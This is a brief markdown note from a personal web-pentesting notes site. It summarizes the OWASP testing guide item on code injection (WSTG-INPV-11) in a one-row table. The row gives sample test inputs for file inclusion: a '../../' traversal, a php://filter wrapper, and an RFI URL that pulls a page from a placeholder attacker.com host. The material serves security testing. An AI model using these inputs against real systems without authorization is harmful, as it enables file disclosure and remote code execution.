---
title: Testing for Code Injection - OWASP Web Security Testing Guide 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - web pentesting
  - WSTG-INPV-11
---



# Testing for Code Injection

!!! quote ""
	[OWASP Web Security Testing Guide 4.2](index.md) > 7. Data Validation Testing > 7.11. Testing for Code Injection

|ID|Link to Hackinglife|Link to OWASP|Description|
|:---|:---|:---|:---|
|7.11|[WSTG-INPV-11](WSTG-INPV-11.md)|[Testing for Code Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection)|- Identify injection points where you can inject code into the application.  - Check LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource).  - Check RFI from malicious URL  ?page.php?file=http://attacker.com/malicious_page  - Assess the injection severity.|

